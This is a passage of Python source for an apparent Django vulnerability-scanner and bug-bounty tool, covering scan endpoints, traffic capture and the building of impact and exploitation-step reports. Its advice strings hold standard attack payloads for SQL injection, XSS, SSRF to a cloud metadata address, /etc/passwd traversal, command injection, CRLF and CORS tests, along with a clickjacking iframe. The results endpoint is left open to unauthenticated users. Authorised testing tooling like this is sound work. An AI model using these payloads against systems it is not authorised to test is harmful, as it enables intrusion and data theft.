from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from rest_framework.decorators import api_view, authentication_classes, permission_classes
from rest_framework.authentication import TokenAuthentication, SessionAuthentication
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework.response import Response
from .models import ScanTarget, Scan, Vulnerability, ExploitMedia, ProgramScope
from django.utils import timezone
from django.conf import settings
import os
import html as _html
import json
import logging
import threading
import time
import urllib.parse
from celery.result import AsyncResult
from scanner.tasks import async_exploit_all_vulnerabilities, async_exploit_selected_vulnerabilities, async_scan_task
from scanner.config_defaults import get_default_proof_config
from scanner.bounty_taxonomy import get_bounty_classification, is_dos_vulnerability
from scanner.scope_validator import ScopeValidator

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# HTTP capture machinery for auto-logging scanner traffic to the Repeater
# ---------------------------------------------------------------------------

# Thread-local storage for the active scan capture context
_scan_capture_local = threading.local()


def _set_scan_capture_context(scan, plugin_name):
    """Activate HTTP capturing for the current thread."""
    _scan_capture_local.scan = scan
    _scan_capture_local.plugin_name = plugin_name


def _clear_scan_capture_context():
    """Deactivate HTTP capturing for the current thread."""
    _scan_capture_local.scan = None
    _scan_capture_local.plugin_name = None


def _generate_scan_analysis_advice(prepared_request, plugin_name):
    """
    Generate analysis advice for a captured scanner request.

    Inspects the HTTP method, URL, headers, and body to produce actionable
    guidance about which parameters to modify during manual testing.
    """
    method = (prepared_request.method or 'GET').upper()
    url = prepared_request.url or ''
    body = prepared_request.body or ''
    if isinstance(body, bytes):
        try:
            body = body.decode('utf-8', errors='replace')
        except Exception:
            body = ''

    content_type = ''
    for k, v in (prepared_request.headers or {}).items():
        if k.lower() == 'content-type':
            content_type = v
            break

    lines = [f'Plugin: {plugin_name}', f'Target: {method} {url}']

    # URL parameters
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if qs:
        lines.append('URL Parameters to Test:')
        for param, values in qs.items():
            lines.append(f'  - {param}: {values[0]}  → try injection / fuzzing payloads')

    # Body parameters
    if body:
        lines.append('Body Parameters to Test:')
        if 'json' in content_type.lower():
            try:
                body_data = json.loads(body)
                if isinstance(body_data, dict):
                    for k, v in body_data.items():
                        lines.append(f'  - {k}: {v}  → try SQLi / XSS / command injection')
            except Exception:
                lines.append(f'  (raw body) → modify directly for injection testing')
        elif 'form' in content_type.lower() or not content_type:
            try:
                params = urllib.parse.parse_qs(body, keep_blank_values=True)
                for k, v in params.items():
                    lines.append(f'  - {k}: {v[0]}  → try SQLi / XSS payloads')
            except Exception:
                lines.append(f'  (raw body) → modify directly for injection testing')
        else:
            lines.append(f'  (body length: {len(body)}) → inspect and modify as needed')

    # Plugin-type specific hints
    plugin_lower = plugin_name.lower()
    if 'sqli' in plugin_lower or 'sql' in plugin_lower:
        lines.append("Suggested Modifications (SQLi):")
        lines.append("  1. Replace parameter values with: ' OR 1=1-- , \" OR \"\"=\"")
        lines.append("  2. Time-based blind: ' AND SLEEP(5)--")
        lines.append("  3. Add header X-Forwarded-For: 1' OR SLEEP(5)--")
    elif 'xss' in plugin_lower:
        lines.append("Suggested Modifications (XSS):")
        lines.append("  1. Replace values with: <script>alert(1)</script>")
        lines.append("  2. Try: \"><img src=x onerror=alert(1)>")
        lines.append("  3. Check Referer and User-Agent headers for reflection")
    elif 'ssrf' in plugin_lower:
        lines.append("Suggested Modifications (SSRF):")
        lines.append("  1. Replace URL params with: http://169.254.169.254/latest/meta-data/")
        lines.append("  2. Try internal IPs: http://127.0.0.1/, http://10.0.0.1/")
        lines.append("  3. Use bypass: http://[::1]/, http://0.0.0.0/")
    elif 'lfi' in plugin_lower or 'path' in plugin_lower or 'traversal' in plugin_lower:
        lines.append("Suggested Modifications (Path Traversal/LFI):")
        lines.append("  1. Replace file/path params with: ../../../etc/passwd")
        lines.append("  2. Try URL-encoded: %2e%2e%2f%2e%2e%2fetc%2fpasswd")
    elif 'cmd' in plugin_lower or 'command' in plugin_lower or 'rce' in plugin_lower:
        lines.append("Suggested Modifications (Command Injection):")
        lines.append("  1. Append: ; id , && id , | id")
        lines.append("  2. Try backtick or $() substitution")
    elif 'crlf' in plugin_lower:
        lines.append("Suggested Modifications (CRLF Injection):")
        lines.append("  1. Inject \\r\\n in header values")
        lines.append("  2. Try: %0d%0aSet-Cookie:injected=1")
    elif 'cors' in plugin_lower:
        lines.append("Suggested Modifications (CORS):")
        lines.append("  1. Change Origin header to: https://evil.com")
        lines.append("  2. Try null origin: Origin: null")

    lines.append("Headers to Inspect:")
    injectable_headers = ['X-Forwarded-For', 'Referer', 'User-Agent', 'X-Custom-IP-Authorization']
    for h in injectable_headers:
        lines.append(f'  - {h}: may be injectable / reflected')

    return '\n'.join(lines)


def _capture_scan_request(prepared_request, response, elapsed_ms):
    """
    Persist a scanner HTTP request/response pair to the Repeater.

    Called by the monkey-patched Session.send() when a scan capture context
    is active for the current thread.
    """
    scan = getattr(_scan_capture_local, 'scan', None)
    plugin_name = getattr(_scan_capture_local, 'plugin_name', 'unknown')
    if scan is None:
        return

    try:
        from repeater.models import RepeaterRequest as _RepeaterRequest
        from repeater.models import RepeaterResponse as _RepeaterResponse

        url = prepared_request.url or ''
        method = (prepared_request.method or 'GET').upper()

        # Serialize request headers
        req_headers = dict(prepared_request.headers or {})
        headers_str = json.dumps(req_headers)

        # Request body
        body = prepared_request.body or ''
        if isinstance(body, bytes):
            try:
                body = body.decode('utf-8', errors='replace')
            except Exception:
                body = ''

        name = f'[Scan #{scan.id}] {plugin_name} - {url}'[:255]
        advice = _generate_scan_analysis_advice(prepared_request, plugin_name)

        repeater_req = _RepeaterRequest.objects.create(
            url=url,
            method=method,
            headers=headers_str,
            body=body,
            name=name,
            scan=scan,
            source='scanner',
            analysis_advice=advice,
        )

        # Serialize response headers
        try:
            resp_headers = dict(response.headers or {})
            resp_headers_str = json.dumps(resp_headers)
        except Exception:
            resp_headers_str = '{}'

        # Response body
        try:
            resp_body = response.text or ''
        except Exception:
            resp_body = ''

        _RepeaterResponse.objects.create(
            request=repeater_req,
            status_code=response.status_code,
            headers=resp_headers_str,
            body=resp_body,
            response_time=elapsed_ms,
        )
    except Exception as exc:
        logger.debug('_capture_scan_request failed: %s', exc)


# Monkey-patch requests.Session.send once at import time so all sessions
# (including those created inside plugins) are automatically intercepted.
try:
    import requests as _requests_lib

    _original_session_send = _requests_lib.Session.send

    def _capturing_session_send(self, prepared_request, **kwargs):
        scan = getattr(_scan_capture_local, 'scan', None)
        if scan is not None:
            start = time.time()
            response = _original_session_send(self, prepared_request, **kwargs)
            elapsed_ms = (time.time() - start) * 1000.0
            _capture_scan_request(prepared_request, response, elapsed_ms)
            return response
        return _original_session_send(self, prepared_request, **kwargs)

    _requests_lib.Session.send = _capturing_session_send
    logger.debug('Scanner HTTP capture: requests.Session.send monkey-patched')
except Exception as _patch_err:
    logger.warning('Scanner HTTP capture: could not patch requests.Session.send: %s', _patch_err)



@api_view(['GET', 'POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def scan_targets(request):
    """List or create scan targets"""
    if request.method == 'GET':
        targets = ScanTarget.objects.all()[:50]
        data = [{
            'id': target.id,
            'name': target.name,
            'url': target.url,
            'created_at': target.created_at.isoformat(),
        } for target in targets]
        return Response(data, status=200)
    
    elif request.method == 'POST':
        target = ScanTarget.objects.create(
            url=request.data.get('url'),
            name=request.data.get('name', '')
        )
        return Response({'id': target.id, 'message': 'Target created'}, status=201)


@api_view(['POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def start_scan(request, target_id):
    """
    Start a vulnerability scan on a target.
    
    This endpoint creates a scan and triggers an async Celery task to execute it.
    The scan runs in the background, allowing Gunicorn to respond immediately
    without blocking workers during long-running scans.
    
    Optional request body parameters:
    - ``scope_id`` / ``program_scope_id``: ID of a ProgramScope to validate against.
      If the target URL fails scope validation a 400 is returned.
      If omitted, the scan proceeds with a warning.
    
    Returns immediately with scan ID and 'pending' status.
    Clients should poll /api/scans/<scan_id>/results/ for progress and results.
    """
    try:
        target = ScanTarget.objects.get(id=target_id)
        
        # Read optional DoS testing opt-in flag from request body
        enable_dos_testing = bool(request.data.get('enable_dos_testing', False))
        # Read optional SQL Injection testing opt-in flag from request body
        enable_sqli_testing = bool(request.data.get('enable_sqli_testing', False))

        # --- Scope validation ---
        scope_id = request.data.get('scope_id') if 'scope_id' in request.data else request.data.get('program_scope_id')
        program_scope = None
        scope_warnings = []

        if scope_id is not None:
            try:
                program_scope = ProgramScope.objects.get(id=scope_id)
            except ProgramScope.DoesNotExist:
                return Response({'error': f'ProgramScope with id {scope_id} not found'}, status=404)

        validator = ScopeValidator(target.url, program_scope)
        validation_result = validator.validate()

        if not validation_result['is_valid']:
            return Response(
                {
                    'error': 'Target URL failed scope validation',
                    'violations': validation_result['violations'],
                },
                status=400,
            )

        scope_warnings = validation_result.get('warnings', [])

        # Create scan with 'pending' status
        scan = Scan.objects.create(
            target=target,
            status='pending',
            enable_dos_testing=enable_dos_testing,
            enable_sqli_testing=enable_sqli_testing,
            program_scope=program_scope,
            warnings=scope_warnings,
        )
        
        # Trigger Celery task to run scan in background
        task = async_scan_task.delay(scan.id)
        
        # Return immediately with scan ID and task ID
        response_data = {
            'id': scan.id,
            'status': 'pending',
            'message': 'Scan started. Poll /api/scans/{}/results/ for progress.'.format(scan.id),
            'task_id': task.id,
        }
        if scope_warnings:
            response_data['warnings'] = scope_warnings
        return Response(response_data, status=201)
            
    except ScanTarget.DoesNotExist:
        return Response({'error': 'Target not found'}, status=404)
    except Exception as e:
        # If Celery task fails to start, log and return error
        logger.error(f"Failed to start scan: {str(e)}", exc_info=True)
        return Response({'error': f'Failed to start scan: {str(e)}'}, status=500)


def perform_basic_scan(scan, url, scan_profile=None, use_async=False, crawl_first=False, enable_dos_testing=False, enable_sqli_testing=False):
    """
    Perform basic vulnerability scanning using the plugin-based scan engine.

    This function has been refactored to use the modular plugin architecture.
    The old hardcoded checks have been moved into individual scan plugins.

    Args:
        scan: Scan model instance.
        url: Target URL string.
        scan_profile: Optional profile name (``quick``, ``standard``, ``full``,
            ``api``, ``owasp_top10``, ``stealth``).  When provided the profile
            config is merged with the base scan config.
        use_async: If True, use AsyncScanEngine for concurrent plugin execution.
        crawl_first: If True, crawl the target URL and scan all discovered pages.
        enable_dos_testing: If True, include DoS-related plugins in the scan.
            Defaults to False so that potentially destructive tests require
            explicit user opt-in.
        enable_sqli_testing: If True, run SQL Injection tests via the SQL
            Attacker engine after the main scan completes.  Defaults to False.

    Note: This maintains backward compatibility with existing scan API and UI.
    """
    # Get SSL verification setting from environment (default to False for security testing)
    verify_ssl = os.environ.get('MEGIDO_VERIFY_SSL', 'False') == 'True'

    try:
        # Build base config
        config = get_default_proof_config()
        config.update({
            'verify_ssl': verify_ssl,
            'timeout': 10,
            'enable_dos_testing': enable_dos_testing,
        })

        # Merge scan profile overrides (if requested)
        if scan_profile:
            try:
                from scanner.scan_profiles import get_profile
                profile_config = get_profile(scan_profile)
                config.update(profile_config)
            except Exception as e:
                logger.warning(f"Could not load scan profile '{scan_profile}': {e}")

        # Choose engine
        if use_async:
            try:
                from scanner.async_scan_engine import AsyncScanEngine
                engine = AsyncScanEngine(
                    max_concurrent_plugins=config.get('max_concurrent_plugins', 5),
                    max_concurrent_requests=config.get('max_concurrent_requests', 10),
                )
            except Exception as e:
                logger.warning(f"AsyncScanEngine unavailable ({e}), using ScanEngine")
                from scanner.scan_engine import get_scan_engine
                engine = get_scan_engine()
        else:
            from scanner.scan_engine import get_scan_engine
            engine = get_scan_engine()

        # Optionally crawl first and scan every discovered URL
        all_findings = []
        urls_to_scan = [url]

        if crawl_first:
            try:
                from scanner.crawler import Crawler
                crawler = Crawler(
                    max_depth=config.get('crawl_depth', 2),
                    max_urls=config.get('crawl_max_urls', 50),
                    verify_ssl=verify_ssl,
                )
                crawl_result = crawler.crawl(url, config)
                if crawl_result.discovered_urls:
                    urls_to_scan = crawl_result.discovered_urls
                    logger.info(
                        f"Crawler discovered {len(urls_to_scan)} URL(s) — scanning all."
                    )
            except Exception as e:
                logger.warning(f"Crawler failed ({e}), scanning seed URL only")

        # Run the scan on each URL
        enabled_plugins = config.get('enabled_plugins')
        for target_url in urls_to_scan:
            try:
                if use_async:
                    # AsyncScanEngine: collect all findings then save in batch below
                    _set_scan_capture_context(scan, 'async_scan')
                    try:
                        if enabled_plugins:
                            findings = engine.scan_with_plugins(target_url, enabled_plugins, config)
                        else:
                            findings = engine.scan(target_url, config)
                    finally:
                        _clear_scan_capture_context()
                    all_findings.extend(findings)
                else:
                    # ScanEngine: iterate plugins and save findings incrementally after each plugin
                    if enabled_plugins:
                        plugin_list = [
                            engine.registry.get_plugin(pid)
                            for pid in enabled_plugins
                            if engine.registry.get_plugin(pid)
                        ]
                    else:
                        plugin_list = engine.registry.get_all_plugins()
                    for plugin in plugin_list:
                        try:
                            # Skip DoS-related plugins unless explicitly enabled
                            plugin_vuln_type = getattr(plugin, 'vulnerability_type', None)
                            if not enable_dos_testing:
                                if plugin_vuln_type and is_dos_vulnerability(plugin_vuln_type):
                                    logger.info(
                                        f"Skipping DoS plugin {plugin.name} (DoS testing not enabled)"
                                    )
                                    continue
                            _set_scan_capture_context(scan, plugin.name)
                            try:
                                plugin_findings = plugin.scan(target_url, config)
                            finally:
                                _clear_scan_capture_context()
                            if plugin_findings:
                                engine.save_findings_to_db(scan, plugin_findings)
                                logger.info(
                                    f"Plugin {plugin.name}: saved {len(plugin_findings)} "
                                    f"finding(s) for {target_url}"
                                )
                        except Exception as e:
                            _clear_scan_capture_context()
                            logger.error(
                                f"Error running plugin {plugin.name} on {target_url}: {e}"
                            )
            except Exception as e:
                logger.error(f"Error scanning {target_url}: {e}")

        # For async engine path: deduplicate, correlate, then save in batch
        if use_async:
            try:
                from scanner.deduplication import deduplicate_and_correlate
                all_findings = deduplicate_and_correlate(all_findings)
            except Exception as e:
                logger.warning(f"Deduplication failed ({e}), using raw findings")

            # Save findings to database
            engine.save_findings_to_db(scan, all_findings)

        # Apply advanced features to all vulnerabilities after scanning
        try:
            from scanner.exploit_integration import apply_advanced_features_to_scan
            apply_advanced_features_to_scan(scan.id)
        except Exception as e:
            print(f"Warning: Could not apply advanced features: {e}")

        # Run SQL Injection testing if enabled
        if enable_sqli_testing or getattr(scan, 'enable_sqli_testing', False):
            _run_sqli_testing(scan)

    except Exception as e:
        print(f"Error during scan: {e}")
        # Re-raise exception for upstream handling
        raise


def _get_scan_vuln_urls(scan):
    """
    Return the set of unique URLs to test for SQL injection for *scan*.

    Uses the scan's discovered vulnerability URLs when available, falling back
    to the scan target URL when none have been recorded yet.
    """
    urls = set(
        scan.vulnerabilities.exclude(url='').values_list('url', flat=True)
    )
    if not urls:
        urls = {scan.target.url}
    return urls


def _run_sqli_testing(scan):
    """
    Run SQL Injection tests via the SQL Attacker engine for all discovered
    vulnerability URLs associated with *scan*.

    Creates a SQLInjectionTask for each unique target URL found in the scan's
    vulnerabilities and executes it synchronously.  Failures are logged as
    warnings but never propagate — the scanner must remain functional even
    when the sql_attacker module is unavailable.
    """
    try:
        from sql_attacker.models import SQLInjectionTask
        from sql_attacker.services import execute_task
    except ImportError:
        logger.warning("sql_attacker module not available; skipping SQL Injection testing.")
        return

    try:
        for target_url in _get_scan_vuln_urls(scan):
            try:
                sqli_task = SQLInjectionTask.objects.create(
                    target_url=target_url,
                    http_method='GET',
                )
                execute_task(sqli_task.id)
                logger.info(
                    "SQLi test completed for scan %d, url %s (task %d)",
                    scan.id, target_url, sqli_task.id,
                )
            except Exception as exc:
                logger.warning(
                    "SQLi test failed for scan %d, url %s: %s",
                    scan.id, target_url, exc,
                )
    except Exception as exc:
        logger.warning("SQLi testing could not be initiated for scan %d: %s", scan.id, exc)


@api_view(['GET'])
@permission_classes([AllowAny])
def scan_results(request, scan_id):
    """Get results of a scan"""
    try:
        scan = Scan.objects.get(id=scan_id)
        vulnerabilities = scan.vulnerabilities.all()
        
        # Filter false positives by default unless explicitly requested
        include_false_positives = request.GET.get('include_false_positives', 'false').lower() == 'true'
        if not include_false_positives:
            vulnerabilities = vulnerabilities.exclude(false_positive_status='false_positive')
        
        # Option to filter by verified status
        verified_only = request.GET.get('verified_only', 'false').lower() == 'true'
        if verified_only:
            vulnerabilities = vulnerabilities.filter(verified=True)
        
        # Order by risk score descending by default
        vulnerabilities = vulnerabilities.order_by('-risk_score', '-discovered_at')
        
        data = {
            'scan_id': scan.id,
            'status': scan.status,
            'started_at': scan.started_at.isoformat(),
            'completed_at': scan.completed_at.isoformat() if scan.completed_at else None,
            'warnings': scan.warnings if hasattr(scan, 'warnings') else [],
            'vulnerabilities': [{
                'id': vuln.id,
                'type': vuln.get_vulnerability_type_display(),
                'vulnerability_type': vuln.vulnerability_type,
                'severity': vuln.severity,
                'url': vuln.url,
                'parameter': vuln.parameter,
                'description': vuln.description,
                'evidence': vuln.evidence,
                'remediation': vuln.remediation,
                'exploited': vuln.exploited,
                'exploit_status': vuln.exploit_status,
                'exploit_result': vuln.exploit_result,
                # Advanced features
                'verified': vuln.verified,
                'proof_of_impact': vuln.proof_of_impact,
                'risk_score': vuln.risk_score,
                'risk_level': vuln.risk_level,
                'confidence_score': vuln.confidence_score,
                'false_positive_status': vuln.false_positive_status,
                'compliance_violations': vuln.compliance_violations,
                'remediation_priority': vuln.remediation_priority,
                'remediation_effort': vuln.remediation_effort,
                # Discovery data
                'successful_payloads': vuln.successful_payloads,
                'repeater_data': vuln.repeater_data,
                'http_traffic': vuln.http_traffic,
                'discovered_at': vuln.discovered_at.isoformat() if vuln.discovered_at else None,
                # Visual proof media
                'visual_proof_path': vuln.visual_proof_path,
                'visual_proof_type': vuln.visual_proof_type,
                'visual_proof_status': vuln.visual_proof_status if hasattr(vuln, 'visual_proof_status') else 'not_attempted',
                'exploit_media': _serialize_exploit_media(vuln.exploit_media.all()),
                # Step-by-step PoC data
                'poc_steps': _parse_poc_steps(vuln.poc_steps_json),
                'poc_html_report_path': vuln.poc_html_report_path,
                'poc_step_count': vuln.poc_step_count,
                'bounty_classification': get_bounty_classification(
                    vuln.vulnerability_type,
                    verified=vuln.verified,
                ),
                # Bug-bounty ready impact summary and exploitation steps
                'impact_summary': _build_impact_summary(vuln),
                'exploitation_steps': _build_exploitation_steps(vuln),
            } for vuln in vulnerabilities]
        }

        # Include SQL Injection testing results if the scan had SQLi testing enabled
        if getattr(scan, 'enable_sqli_testing', False):
            data['sqli_results'] = _collect_sqli_results(scan)

        return Response(data, status=200)
    except Scan.DoesNotExist:
        return Response({'error': 'Scan not found'}, status=404)


def _collect_sqli_results(scan):
    """
    Collect SQL Injection results from the sql_attacker module for URLs
    associated with *scan*.

    Returns a list of result dicts, or an empty list when the sql_attacker
    module is unavailable or no results exist.
    """
    try:
        from sql_attacker.models import SQLInjectionTask, SQLInjectionResult
    except ImportError:
        return []

    try:
        tasks = SQLInjectionTask.objects.filter(
            target_url__in=_get_scan_vuln_urls(scan),
            created_at__gte=scan.started_at,
        )
        results = []
        for task in tasks:
            for result in SQLInjectionResult.objects.filter(task=task):
                results.append({
                    'task_id': task.id,
                    'target_url': task.target_url,
                    'status': task.status,
                    'result_id': result.id,
                    'injection_type': result.injection_type,
                    'parameter': result.vulnerable_parameter,
                    'payload': result.test_payload,
                    'confidence_score': result.confidence_score,
                    'risk_score': result.risk_score,
                    'database_type': result.database_type,
                    'severity': result.severity,
                    'detected_at': result.detected_at.isoformat() if result.detected_at else None,
                })
        return results
    except Exception as exc:
        logger.warning("Could not collect SQLi results for scan %d: %s", scan.id, exc)
        return []


def _parse_poc_steps(poc_steps_json):
    """
    Parse poc_steps_json TextField into a Python list.

    Args:
        poc_steps_json: JSON string stored in the poc_steps_json field, or None

    Returns:
        List of step dicts, or empty list if unavailable/invalid
    """
    if not poc_steps_json:
        return []
    try:
        import json
        steps = json.loads(poc_steps_json)
        return steps if isinstance(steps, list) else []
    except (ValueError, TypeError):
        return []


def _build_impact_summary(vuln) -> str:
    """
    Return a concise, human-readable impact summary for the vulnerability.

    Uses the structured proof_of_impact field when available; falls back to
    extracting the "## Real-World Impact" section, then to a type-specific
    impact description from the known impact maps, and finally to a plain
    severity/type sentence.

    For ``security_misconfig`` / ``security_misconfiguration`` vulnerabilities,
    the function parses the evidence to extract missing header names and returns
    a specific, actionable impact string instead of the generic fallback.

    Args:
        vuln: Vulnerability model instance

    Returns:
        Single-paragraph impact summary string
    """
    if vuln.proof_of_impact:
        # Extract the Real-World Impact section if it exists (generated by exploit_integration)
        for line in vuln.proof_of_impact.splitlines():
            if line.startswith('## Real-World Impact'):
                # The impact text follows this heading
                idx = vuln.proof_of_impact.find('## Real-World Impact')
                after = vuln.proof_of_impact[idx + len('## Real-World Impact'):].lstrip('\n')
                # Return up to the next section heading
                next_heading = after.find('\n##')
                if next_heading > 0:
                    return after[:next_heading].strip()
                return after.strip()
        # No structured section – return first 300 characters of raw proof
        return vuln.proof_of_impact[:300].strip()

    # No proof_of_impact yet — use type-specific impact descriptions
    vuln_type = (vuln.vulnerability_type or '').lower()

    # Security-misconfiguration: build header-specific impact from evidence
    if vuln_type in ('security_misconfig', 'security_misconfiguration'):
        evidence_src = vuln.evidence or ''
        # Also check exploit_result for header analysis data
        if not evidence_src and vuln.exploit_result:
            evidence_src = vuln.exploit_result
        header_impacts = _extract_missing_header_impacts(evidence_src)
        if header_impacts:
            # Lead with the highest-impact headers first (X-Frame-Options > CSP > others)
            priority = ['clickjacking', 'script execution', 'downgrade', 'MIME']
            header_impacts.sort(
                key=lambda s: next(
                    (i for i, p in enumerate(priority) if p.lower() in s.lower()), len(priority)
                )
            )
            return (
                'Missing security headers: '
                + '; '.join(header_impacts[:3])
                + '. '
                + 'An attacker can leverage these missing headers to perform clickjacking, '
                'XSS, or network-level attacks depending on the specific headers absent.'
            )

    # Check exploit_integration's _VULN_IMPACT_MAP first
    try:
        from scanner.exploit_integration import _VULN_IMPACT_MAP
        if vuln_type in _VULN_IMPACT_MAP:
            return _VULN_IMPACT_MAP[vuln_type]['impact']
    except ImportError:
        pass

    # Fall back to bounty_report_generator IMPACT_MAP
    try:
        from scanner.bounty_report_generator import IMPACT_MAP as _BOUNTY_IMPACT_MAP
        if vuln_type in _BOUNTY_IMPACT_MAP:
            bmap = _BOUNTY_IMPACT_MAP[vuln_type]
            attacker_impacts = bmap.get('attacker_impact', [])
            if attacker_impacts:
                # For security_misconfig, enrich with evidence-derived header details
                if vuln_type in ('security_misconfig', 'security_misconfiguration') and vuln.evidence:
                    header_details = _extract_missing_header_impacts(vuln.evidence)
                    if header_details:
                        return (
                            'Missing security headers detected: '
                            + '; '.join(header_details[:3])
                            + '. '
                            + attacker_impacts[0]
                            + '.'
                        )
                return 'As an attacker, I can: ' + attacker_impacts[0] + '.'
    except ImportError:
        pass

    # Last resort: plain severity/type sentence
    severity = (vuln.severity or 'unknown').capitalize()
    vuln_type_display = (
        vuln.get_vulnerability_type_display()
        if hasattr(vuln, 'get_vulnerability_type_display')
        else vuln.vulnerability_type or 'Unknown'
    )
    return (
        f"{severity}-severity {vuln_type_display} vulnerability detected at {vuln.url}."
    )


def _extract_missing_header_impacts(evidence: str) -> list:
    """
    Parse evidence text for security_misconfig to extract missing header names
    and return short impact phrases for each.

    Args:
        evidence: Evidence string from a security_misconfig vulnerability

    Returns:
        List of short impact strings, one per identified missing header
    """
    _HEADER_IMPACT = {
        'content-security-policy': 'Missing Content-Security-Policy allows arbitrary script execution',
        'csp': 'Missing Content-Security-Policy allows arbitrary script execution',
        'x-frame-options': 'Missing X-Frame-Options enables clickjacking via transparent iframes',
        'x-content-type-options': 'Missing X-Content-Type-Options enables MIME-type confusion attacks',
        'strict-transport-security': 'Missing HSTS permits HTTP downgrade and man-in-the-middle attacks',
        'hsts': 'Missing HSTS permits HTTP downgrade and man-in-the-middle attacks',
        'referrer-policy': 'Missing Referrer-Policy leaks sensitive URLs to third parties',
        'permissions-policy': 'Missing Permissions-Policy allows unrestricted browser feature access',
        'feature-policy': 'Missing Permissions-Policy allows unrestricted browser feature access',
        'x-xss-protection': 'Missing X-XSS-Protection disables legacy browser XSS filter',
    }
    found = []
    seen = set()
    evidence_lower = evidence.lower()
    for header_key, impact_phrase in _HEADER_IMPACT.items():
        if header_key in evidence_lower and impact_phrase not in seen:
            seen.add(impact_phrase)
            found.append(impact_phrase)
    return found


def _build_exploitation_steps(vuln) -> list:
    """
    Return a list of step dicts describing the actions taken during exploitation.

    Pulls data from repeater_data (populated during exploitation) and falls back
    to synthesising steps from available evidence fields.

    Args:
        vuln: Vulnerability model instance

    Returns:
        List of step dicts with keys: step, title, description, request, response
    """
    steps = []

    # Prefer structured repeater_data recorded during exploitation
    if vuln.repeater_data and isinstance(vuln.repeater_data, list):
        for idx, entry in enumerate(vuln.repeater_data, 1):
            if not isinstance(entry, dict):
                continue
            step = {
                'step': idx,
                'title': entry.get('description') or f"Step {idx}: {entry.get('method', 'GET')} {entry.get('url', '')}",
                'description': entry.get('description', ''),
                'request': _format_http_request(entry),
                'response': _format_http_response(entry.get('response', {})),
            }
            steps.append(step)
        if steps:
            return steps

    # Fall back to synthesising minimal steps from evidence
    if vuln.exploit_result:
        # Parse "--- Exploitation Steps ---" blocks generated by format_exploit_result
        raw = vuln.exploit_result
        in_steps = False
        current: dict = {}
        step_num = 0
        for line in raw.splitlines():
            if line.startswith('--- Exploitation Steps ---'):
                in_steps = True
                continue
            if in_steps and line.startswith('---'):
                in_steps = False
            if in_steps and line.startswith('Step '):
                if current:
                    steps.append(current)
                step_num += 1
                current = {
                    'step': step_num,
                    'title': line.strip(),
                    'description': line.strip(),
                    'request': '',
                    'response': '',
                }
            elif in_steps and current:
                if line.strip().startswith('Request Body:'):
                    current['request'] = line.strip()
                elif line.strip().startswith('Response'):
                    current['response'] = (current.get('response', '') + '\n' + line).strip()
        if current:
            steps.append(current)

    if steps:
        return steps

    # Type-specific fallback: generate meaningful steps from evidence
    vuln_type = (vuln.vulnerability_type or '').lower()
    evidence = (vuln.evidence or '').strip()
    url = vuln.url or ''
    param = vuln.parameter or 'the vulnerable parameter'

    if vuln_type == 'security_misconfig' and evidence:
        # Generate one step per missing header found in the evidence
        _HEADER_STEPS = {
            'content-security-policy': (
                'Content-Security-Policy (CSP) header is absent',
                'Without CSP, any injected script runs without restriction. '
                'Inject a simple XSS payload into a reflected parameter and confirm execution.',
            ),
            'csp': (
                'Content-Security-Policy (CSP) header is absent',
                'Without CSP, any injected script runs without restriction. '
                'Inject a simple XSS payload into a reflected parameter and confirm execution.',
            ),
            'x-frame-options': (
                'X-Frame-Options header is absent',
                'Frame the target page in a transparent iframe on an attacker-controlled site. '
                'Confirm the page loads inside the iframe using: '
                '<iframe src="' + _html.escape(url, quote=True) + '" style="opacity:0;position:absolute;'
                'top:0;left:0;width:100%;height:100%;"></iframe>',
            ),
            'x-content-type-options': (
                'X-Content-Type-Options header is absent',
                'Upload a file with a misleading extension (e.g., a JS file named .jpg). '
                'The browser will execute it based on content sniffing.',
            ),
            'strict-transport-security': (
                'Strict-Transport-Security (HSTS) header is absent',
                'Perform an SSL-strip man-in-the-middle attack to downgrade the connection '
                'to plain HTTP and intercept session cookies or credentials.',
            ),
            'hsts': (
                'Strict-Transport-Security (HSTS) header is absent',
                'Perform an SSL-strip man-in-the-middle attack to downgrade the connection '
                'to plain HTTP and intercept session cookies or credentials.',
            ),
        }
        _HEADER_DISPLAY_NAMES = {
            'content-security-policy': 'Content-Security-Policy',
            'csp': 'Content-Security-Policy',
            'x-frame-options': 'X-Frame-Options',
            'x-content-type-options': 'X-Content-Type-Options',
            'strict-transport-security': 'Strict-Transport-Security',
            'hsts': 'Strict-Transport-Security (HSTS)',
        }
        evidence_lower = evidence.lower()
        for header_key, (title, desc) in _HEADER_STEPS.items():
            if header_key in evidence_lower:
                display_name = _HEADER_DISPLAY_NAMES.get(header_key, header_key.title())
                steps.append({
                    'step': len(steps) + 1,
                    'title': title,
                    'description': desc,
                    'request': f'GET {url} HTTP/1.1',
                    'response': f'# Response is missing the {display_name} header',
                })
        if steps:
            # Add a final confirmation step
            steps.append({
                'step': len(steps) + 1,
                'title': 'Confirm impact of missing headers',
                'description': (
                    'Verify with a security header checker tool (e.g., securityheaders.com) '
                    f'that the headers are absent from {url} and document each missing header '
                    'alongside its specific attack scenario.'
                ),
                'request': '',
                'response': '',
            })
            return steps

    elif vuln_type in ('captcha_bypass', 'other') and evidence:
        # Parse "Method N:" entries from captcha bypass evidence
        method_steps = []
        current_method = None
        for line in evidence.splitlines():
            stripped = line.strip()
            if stripped.startswith('Method ') and ':' in stripped:
                if current_method:
                    method_steps.append(current_method)
                method_num = stripped.split(':', 1)[0]
                method_desc = stripped.split(':', 1)[1].strip() if ':' in stripped else stripped
                current_method = {'num': method_num, 'desc': method_desc, 'detail': ''}
            elif current_method and stripped:
                current_method['detail'] = (current_method['detail'] + ' ' + stripped).strip()
        if current_method:
            method_steps.append(current_method)

        if method_steps:
            steps.append({
                'step': 1,
                'title': f'Identify the CAPTCHA-protected endpoint at {url}',
                'description': (
                    f'Navigate to {url} and observe the CAPTCHA challenge mechanism. '
                    'Capture the request using a proxy (Burp Suite) to inspect the '
                    'CAPTCHA token field and submission flow.'
                ),
                'request': '',
                'response': '',
            })
            for ms in method_steps[:5]:
                steps.append({
                    'step': len(steps) + 1,
                    'title': f"Bypass attempt: {ms['num']}",
                    'description': ms['desc'] + (f' — {ms["detail"]}' if ms['detail'] else ''),
                    'request': '',
                    'response': '',
                })
            steps.append({
                'step': len(steps) + 1,
                'title': 'Confirm bypass and demonstrate automated abuse',
